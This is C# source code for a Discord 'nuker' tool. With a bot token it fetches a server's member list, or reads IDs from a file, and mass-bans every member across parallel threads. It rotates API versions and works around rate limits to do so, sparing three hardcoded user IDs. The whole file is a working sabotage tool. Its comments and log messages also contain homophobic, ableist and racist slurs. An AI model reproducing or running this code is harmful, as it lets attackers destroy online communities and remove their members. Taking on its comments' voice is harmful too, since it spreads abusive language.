// System
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net;
using System.Drawing;
using System.IO;
using System.Diagnostics;

// Custom
using LithiumNukerV2;
using Veylib.CLIUI;

// Nuget
using Newtonsoft.Json;

namespace LunaNuker
{
    public class Users
    {
        public delegate void noret();
        public static event noret Finished;

        private static Core core = Core.GetInstance();

        private string token;
        private long guildId;
        private int threads;
        public Users(string tok, long gid, int threadCount)
        {
            token = tok;
            guildId = gid;
            threads = threadCount;
        }


        public void BanAll(bool banIds = false)
        {
            #region Vars for nuker
            List<string> members = new List<string>();
            List<string> whitelistedIds = new List<string> { "921558491255148615", "884903196340932659", "860891644169683014" };
            var loads = new List<List<string>>();
            #endregion

            #region If not ID nuking, check permissions for bot
            if (banIds)
                members = new List<string>(File.ReadAllLines("ids.txt"));
            else
                getMembers();

            whitelistedIds.Add((string)getUserInfo("@me").id);

            core.WriteLine($"Banning ${members.Count} members");
            banMembers();

            #endregion

            dynamic getUserInfo(object userId)
            {
                var req = WebRequest.Create($"https://discord.com/api/v9/users/{userId}");
                req.Timeout = 5000;
                req.Headers.Add("Authorization", $"Bot {token}");

                dynamic resp;

                try
                {
                    var res = req.GetResponse();
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(res.GetResponseStream()).ReadToEnd());
                    res.Close();
                }
                catch (WebException ex)
                {
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(ex.Response.GetResponseStream()).ReadToEnd());
                }

                core.WriteLine(Color.Lime, $"Got information on {resp.id}");

                return resp;
            }

            void getMembers()
            {
                core.WriteLine("Fetching members...");
                //core.UpdateTitleStatus("Fetching members");

                var req = WebRequest.Create($"https://discord.com/api/v9/guilds/{guildId}/members?limit=1000");
                req.Headers.Add("Authorization", $"Bot {token}");
                req.Timeout = 5000;
                dynamic resp = null;

                try
                {
                    var res = req.GetResponse();
                    resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(res.GetResponseStream()).ReadToEnd());
                    res.Close();
                }
                catch (WebException ex)
                {
                    try
                    {
                        resp = JsonConvert.DeserializeObject<dynamic>(new StreamReader(ex.Response.GetResponseStream()).ReadToEnd());
                    } catch { resp = "timeout"; };
                }

                if (resp == null)
                {
                    core.WriteLine(Color.Red, "No response somehow. Kinda gay ngl");
                    return;
                }
                else
                {
                    try
                    {
                        if (resp.code == 50001)
                        {
                            core.WriteLine(Color.Red, "Make sure to enable \"SERVER MEMBERS INTENT\" in the bot page, aborting.");
                            return;
                        } else if (resp == "timeout")
                        {
                            core.WriteLine(Color.Red, "Request timeout");
                        }
                    }
                    catch { }
                }

                for (var x = 0; x < resp.Count; x++)
                {
                    try
                    {
                        members.Add(resp[x].user.id.ToString());
                    }
                    catch { }
                }
            }

            void banMembers()
            {
                int finished = 0;
                var allLoads = WorkController.Seperate(members, threads);
                foreach (var load in allLoads)
                {
                    core.WriteLine($"Banning {load.Count} members in a load");

                    int v = 6;
                    new Thread(() =>
                    {
                        if (v > 9)
                            v = 6;
                        else
                            v++;
                        ban(load, v);

                        lock (finished.GetType())
                            finished++;

                        if (finished == allLoads.Count)
                            Finished?.Invoke();
                    }).Start(); // actually start the thread
                }

                void ban(List<string> Load, int apiv)
                {
                    int og = Load.Count;
                    while (true)
                    {
                        try
                        {
                            if (Load.Count == 0)
                                return;

                            string member = Load[0];

                            if (whitelistedIds.Contains(member))
                            {
                                core.WriteLine(Color.Yellow, $"Skipped {member} [whitelisted]");
                                Load.Remove(member);
                                continue;
                            }

                            var req = WebRequest.Create($"https://discord.com/api/v{apiv}/guilds/{guildId}/bans/{member}");
                            req.Method = "PUT";
                            //req.ContentType = "application/json";
                            req.Headers.Add("Authorization", $"Bot {token}");
                            req.Timeout = 5000;
                            req.Proxy = null;
                            req.ContentLength = 0;

                            dynamic resp = null;
                            string rawResp = null;
                            dynamic jsonResp;
                            bool err = false;

                            try
                            {
                                resp = req.GetResponse();
                                rawResp = new StreamReader(resp.GetResponseStream()).ReadToEnd();
                                resp.Close();
                                Debug.WriteLine($"{member} banned");
                            }
                            catch (WebException ex)
                            {
                                Debug.WriteLine(ex);

                                err = true;
                                try
                                {
                                    rawResp = new StreamReader(ex.Response?.GetResponseStream())?.ReadToEnd();
                                } catch (Exception ex2)
                                {
                                    Debug.WriteLine(ex2);
                                    rawResp = "timeout"; 
                                }
                            }

                            if (rawResp != null && rawResp.ToString().Length > 0 && rawResp != "timeout")
                            {
                                try
                                {
                                    Debug.WriteLine(rawResp);
                                    jsonResp = JsonConvert.DeserializeObject<dynamic>(rawResp);

                                    if (jsonResp.message == "You are being rate limited.") // thats a tad bit homo
                                    {
                                        core.WriteLine(Color.Red, $"Ratelimited. Delayed {jsonResp.retry_after} seconds");
                                        Thread.Sleep(jsonResp.retry_after * 1000);
                                        //x--; // give it another try
                                        continue;
                                    }
                                    else if (((string)jsonResp.message).Contains("Max number of bans for non-guild members have been exceeded. Try again later")) // wow thats so autistic i want to be racist
                                    {
                                        core.WriteLine(Color.Red, "Discord's gay ass API is blocked all ID bans. You're gonna have to wait a while or make a new server to test in");
                                        Load.Clear();
                                        return;
                                    } else if (rawResp == "timeout")
                                    {
                                        core.WriteLine(Color.Red, "Request timeout");
                                        continue;
                                    }
                                }
                                catch (Exception ex) {
                                    Debug.WriteLine(ex);
                                }
                            }

                            int code = 0;
                            if (resp != null)
                                code = (int)((HttpWebResponse)resp).StatusCode;

                            if (!err)
                            {
                                //if (code >= 200 && code < 300) // 2xx is success.
                                //{
                                    core.WriteLine(Color.Lime, $"Banned {member}"); // very cool!

                                    Load.Remove(member); // remove the member
                                //,}
                            }
                            else
                            {
                                core.WriteLine(Color.Red, $"Failed to ban {member}");
                                Debug.WriteLine($"resp : {resp}");
                                Load.Remove(member); // remove the member
                            }
                        } catch (Exception ex)
                        {
                            Debug.WriteLine(ex);
                        }
                    }
                }
            }
        }
    }
}
